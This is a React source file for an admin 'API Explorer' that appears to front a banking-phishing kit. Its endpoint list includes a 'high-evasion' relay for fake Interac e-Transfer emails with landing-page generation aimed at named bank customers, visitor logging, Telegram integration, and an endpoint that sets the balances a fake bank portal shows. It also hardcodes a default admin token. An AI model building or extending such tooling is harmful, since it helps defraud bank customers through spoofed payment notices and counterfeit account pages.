import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ChevronLeft, Terminal, Globe, Shield, 
  Copy, Play, Lock, 
  Code, Activity, Server, FileJson
} from 'lucide-react';
import { toast } from 'sonner';

interface Endpoint {
  id: string;
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
  path: string;
  description: string;
  category: 'Auth' | 'Admin' | 'User' | 'System';
  auth: boolean;
  params?: { name: string; type: string; required: boolean; description: string }[];
  requestBody?: Record<string, unknown>;
  responseExample?: Record<string, unknown>;
}

const ENDPOINTS: Endpoint[] = [
  {
    id: 'login',
    method: 'POST',
    path: '/api/auth/login.php',
    description: 'Authenticates a user and returns their profile. Supports auto-creation of new users.',
    category: 'Auth',
    auth: false,
    requestBody: {
      username: 'user@example.com',
      password: 'password123'
    },
    responseExample: {
      success: true,
      user: {
        username: 'user@example.com',
        accounts: { /* ... */ },
        settings: { /* ... */ },
        enabled: true
      }
    }
  },
  {
    id: 'get-settings',
    method: 'GET',
    path: '/api/admin/global-settings.php',
    description: 'Retrieves global system configuration including SMTP and Telegram settings.',
    category: 'Admin',
    auth: true,
    params: [
      { name: 'token', type: 'string', required: true, description: 'Admin authorization token' }
    ],
    responseExample: {
      general: { /* ... */ },
      smtp: { /* ... */ },
      telegram: { /* ... */ }
    }
  },
  {
    id: 'save-settings',
    method: 'POST',
    path: '/api/admin/global-settings.php',
    description: 'Updates global system configuration.',
    category: 'Admin',
    auth: true,
    params: [
      { name: 'token', type: 'string', required: true, description: 'Admin authorization token' }
    ],
    requestBody: {
      general: { app_url: 'https://...', maintenanceMode: false },
      smtp: { host: 'smtp.example.com', port: 587 }
    },
    responseExample: { success: true }
  },
  {
    id: 'list-users',
    method: 'GET',
    path: '/api/admin/users.php',
    description: 'Lists all registered users in the system (passwords redacted).',
    category: 'Admin',
    auth: true,
    params: [
      { name: 'token', type: 'string', required: true, description: 'Admin authorization token' }
    ],
    responseExample: {
      users: [
        { username: 'user1', enabled: true, accounts: { /* ... */ } }
      ]
    }
  },
  {
    id: 'mailer',
    method: 'POST',
    path: '/api/mailer.php',
    description: 'High-evasion email relay for e-Transfer notifications with landing page generation.',
    category: 'System',
    auth: false,
    requestBody: {
      recipient_email: 'target@example.com',
      recipient_name: 'John Doe',
      amount: 1500.00,
      purpose: 'Gift',
      bank_name: 'Scotia'
    },
    responseExample: {
      success: true,
      transaction_id: 'CAXYZ123',
      method: 'nodejs-hybrid'
    }
  },
  {
    id: 'get-logs',
    method: 'GET',
    path: '/api/logs.php',
    description: 'Retrieves live system event logs including visitor activity and deployments.',
    category: 'System',
    auth: false,
    responseExample: {
      logs: [
        { id: 123, action: 'Login Attempt', username: 'admin', timestamp: '...' }
      ]
    }
  },
  {
    id: 'update-balance',
    method: 'POST',
    path: '/api/admin/users/update-balance',
    description: 'Directly modifies a users account balance and triggers a real-time WebSocket update.',
    category: 'User',
    auth: true,
    params: [
      { name: 'token', type: 'string', required: true, description: 'Admin authorization token' }
    ],
    requestBody: {
      username: 'user1',
      account: 'Chequing',
      balance: 50000.00
    },
    responseExample: { success: true }
  }
];

export const ApiExplorerView = ({ onBack }: { onBack: () => void }) => {
  const [selectedEndpoint, setSelectedEndpoint] = useState<Endpoint | null>(null);
  const [testResult, setTestResult] = useState<Record<string, unknown> | null>(null);
  const [isTesting, setIsTesting] = useState(false);
  const [search, setSearch] = useState('');
  const [activeToken, setActiveToken] = useState('projectsarah');

  const filteredEndpoints = ENDPOINTS.filter(e => 
    e.path.toLowerCase().includes(search.toLowerCase()) || 
    e.description.toLowerCase().includes(search.toLowerCase())
  );

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success('Copied to clipboard');
  };

  const handleTest = async (endpoint: Endpoint) => {
    setIsTesting(true);
    setTestResult(null);
    try {
      const url = new URL(endpoint.path, window.location.origin);
      if (endpoint.auth) {
        url.searchParams.set('token', activeToken);
      }
      endpoint.params?.forEach(p => {
        if (p.name !== 'token' && p.required) {
          url.searchParams.set(p.name, 'test_val');
        }
      });

      const options: RequestInit = {
        method: endpoint.method,
        headers: {
          'Content-Type': 'application/json'
        }
      };

      if (['POST', 'PUT', 'PATCH'].includes(endpoint.method)) {
        options.body = JSON.stringify(endpoint.requestBody || {});
      }

      const res = await fetch(url.toString(), options);
      const data = await res.json();
      setTestResult({ status: res.status, data });
    } catch (error) {
      setTestResult({ error: String(error) });
    } finally {
      setIsTesting(false);
    }
  };

  return (
    <div className="h-full flex flex-col bg-[#050505] text-white">
      {/* Header */}
      <div className="p-4 flex items-center gap-4 bg-[#0a0a0a] border-b border-white/5">
        <button onClick={onBack} className="p-2 hover:bg-white/5 rounded-lg transition-colors">
          <ChevronLeft size={20} />
        </button>
        <div className="flex-1">
          <div className="flex items-center gap-2">
            <Terminal className="text-[#FF3B30]" size={16} />
            <h1 className="font-mono text-xs uppercase tracking-widest text-gray-400">Core REST Engine</h1>
          </div>
          <p className="text-xl font-bold">API Explorer</p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1 bg-white/5 rounded-full border border-white/10">
          <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
          <span className="text-[10px] font-mono uppercase">System: Online</span>
        </div>
      </div>

      <div className="flex-1 flex overflow-hidden">
        {/* Sidebar */}
        <div className="w-80 border-r border-white/5 bg-[#080808] flex flex-col">
          <div className="p-4 border-b border-white/5">
            <div className="relative">
              <Globe className="absolute left-3 top-2.5 text-gray-500" size={14} />
              <input 
                type="text"
                placeholder="Search endpoints..."
                value={search}
                onChange={e => setSearch(e.target.value)}
                className="w-full bg-white/5 border border-white/10 rounded-lg pl-9 pr-3 py-2 text-xs focus:outline-none focus:border-[#FF3B30]/50 transition-colors"
              />
            </div>
          </div>
          <div className="flex-1 overflow-y-auto custom-scrollbar">
            {filteredEndpoints.map(endpoint => (
              <button
                key={endpoint.id}
                onClick={() => {
                  setSelectedEndpoint(endpoint);
                  setTestResult(null);
                }}
                className={`w-full p-4 flex flex-col gap-1 text-left transition-all border-b border-white/5 ${
                  selectedEndpoint?.id === endpoint.id ? 'bg-[#FF3B30]/10 border-l-2 border-l-[#FF3B30]' : 'hover:bg-white/5 border-l-2 border-l-transparent'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${
                    endpoint.method === 'GET' ? 'bg-green-500/20 text-green-400' : 
                    endpoint.method === 'POST' ? 'bg-blue-500/20 text-blue-400' : 'bg-gray-500/20 text-gray-400'
                  }`}>
                    {endpoint.method}
                  </span>
                  <span className="text-[10px] text-gray-500 font-mono tracking-tighter uppercase">{endpoint.category}</span>
                </div>
                <div className="text-[11px] font-mono font-medium truncate opacity-90">{endpoint.path}</div>
              </button>
            ))}
          </div>
        </div>

        {/* Details Area */}
        <div className="flex-1 overflow-y-auto bg-[#050505] custom-scrollbar">
          <AnimatePresence mode="wait">
            {selectedEndpoint ? (
              <motion.div 
                key={selectedEndpoint.id}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-8"
              >
                <div className="max-w-3xl mx-auto space-y-8">
                  {/* Endpoint Header */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2">
                       <span className={`text-sm font-bold px-3 py-1 rounded ${
                        selectedEndpoint.method === 'GET' ? 'bg-green-500/20 text-green-400' : 'bg-blue-500/20 text-blue-400'
                      }`}>
                        {selectedEndpoint.method}
                      </span>
                      <h2 className="text-2xl font-mono tracking-tight">{selectedEndpoint.path}</h2>
                      <button onClick={() => copyToClipboard(selectedEndpoint.path)} className="p-2 hover:bg-white/5 rounded-lg text-gray-500 hover:text-white transition-colors">
                        <Copy size={16} />
                      </button>
                    </div>
                    <p className="text-gray-400 leading-relaxed font-light">{selectedEndpoint.description}</p>
                    
                    <div className="flex flex-wrap gap-3">
                      {selectedEndpoint.auth && (
                        <div className="flex items-center gap-2 px-3 py-1 bg-[#FF3B30]/10 text-[#FF3B30] rounded-full text-[10px] font-bold uppercase tracking-wider border border-[#FF3B30]/20">
                          <Lock size={10} />
                          Auth Required
                        </div>
                      )}
                      <div className="flex items-center gap-2 px-3 py-1 bg-white/5 text-gray-400 rounded-full text-[10px] font-bold uppercase tracking-wider border border-white/10">
                         <Shield size={10} />
                         {selectedEndpoint.category}
                      </div>
                    </div>
                  </div>

                  {/* Token Configuration */}
                  {selectedEndpoint.auth && (
                    <div className="bg-[#0a0a0a] rounded-2xl border border-white/5 p-6 space-y-4">
                      <div className="flex items-center gap-2 text-[#FF3B30]">
                        <Lock size={14} />
                        <h3 className="text-xs font-bold uppercase tracking-widest">Authorization</h3>
                      </div>
                      <div className="relative">
                        <input 
                          type="password"
                          value={activeToken}
                          onChange={e => setActiveToken(e.target.value)}
                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:border-[#FF3B30]/50"
                          placeholder="Enter admin token..."
                        />
                        <div className="absolute right-4 top-3.5 text-[10px] text-gray-500 font-mono">TOKEN</div>
                      </div>
                    </div>
                  )}

                  {/* Request Body / Params */}
                  {selectedEndpoint.requestBody && (
                    <div className="space-y-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 text-gray-400">
                          <Code size={14} />
                          <h3 className="text-xs font-bold uppercase tracking-widest">Request Payload</h3>
                        </div>
                        <button onClick={() => copyToClipboard(JSON.stringify(selectedEndpoint.requestBody, null, 2))} className="text-[10px] text-gray-500 hover:text-[#FF3B30] font-bold uppercase tracking-widest transition-colors flex items-center gap-1">
                          <Copy size={10} />
                          Copy JSON
                        </button>
                      </div>
                      <div className="bg-[#0a0a0a] rounded-2xl border border-white/5 font-mono text-[12px] p-6 leading-relaxed overflow-x-auto whitespace-pre text-gray-300">
                        {JSON.stringify(selectedEndpoint.requestBody, null, 2)}
                      </div>
                    </div>
                  )}

                  {/* Execution */}
                  <div className="flex flex-col gap-4">
                    <button 
                      onClick={() => handleTest(selectedEndpoint)}
                      disabled={isTesting}
                      className="w-full py-4 bg-[#FF3B30] hover:bg-[#FF3B30]/90 disabled:opacity-50 text-white rounded-2xl font-bold flex items-center justify-center gap-2 transition-all active:scale-[0.98]"
                    >
                      {isTesting ? (
                         <>
                           <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                           <span className="uppercase tracking-[0.2em] text-xs">Processing Request...</span>
                         </>
                      ) : (
                        <>
                          <Play size={18} fill="currentColor" />
                          <span className="uppercase tracking-[0.2em] text-xs">Execute Command</span>
                        </>
                      )}
                    </button>
                  </div>

                  {/* Results */}
                  <AnimatePresence>
                    {testResult && (
                      <motion.div 
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: 'auto' }}
                        className="space-y-4"
                      >
                         <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2 text-gray-400">
                            <Activity size={14} />
                            <h3 className="text-xs font-bold uppercase tracking-widest">Live Output</h3>
                          </div>
                          {testResult.status && (
                            <div className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                              testResult.status >= 200 && testResult.status < 300 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'
                            }`}>
                              HTTP {testResult.status}
                            </div>
                          )}
                        </div>
                        <div className="bg-[#0a0a0a] rounded-2xl border border-white/5 font-mono text-[12px] p-6 leading-relaxed overflow-x-auto text-blue-300">
                          {JSON.stringify(testResult, null, 2)}
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  {/* Example Response */}
                  {!testResult && selectedEndpoint.responseExample && (
                    <div className="space-y-4 pt-4 opacity-50">
                       <div className="flex items-center gap-2 text-gray-500">
                        <FileJson size={14} />
                        <h3 className="text-xs font-bold uppercase tracking-widest">Schema Definition (Static)</h3>
                      </div>
                      <div className="bg-[#0a0a0a] rounded-2xl border border-white/5 font-mono text-[12px] p-6 leading-relaxed overflow-x-auto whitespace-pre text-gray-500 italic">
                        {JSON.stringify(selectedEndpoint.responseExample, null, 2)}
                      </div>
                    </div>
                  )}
                </div>
              </motion.div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-center p-8 text-gray-700">
                 <Server size={48} className="mb-4 opacity-20" />
                 <p className="text-sm font-mono uppercase tracking-[0.3em]">Initialize Selection</p>
                 <p className="text-xs mt-2 max-w-xs opacity-50">Select an endpoint from the master directory to view technical specifications and execute test packets.</p>
              </div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <style>{`
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 2px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(255, 255, 255, 0.2);
        }
      `}</style>
    </div>
  );
};
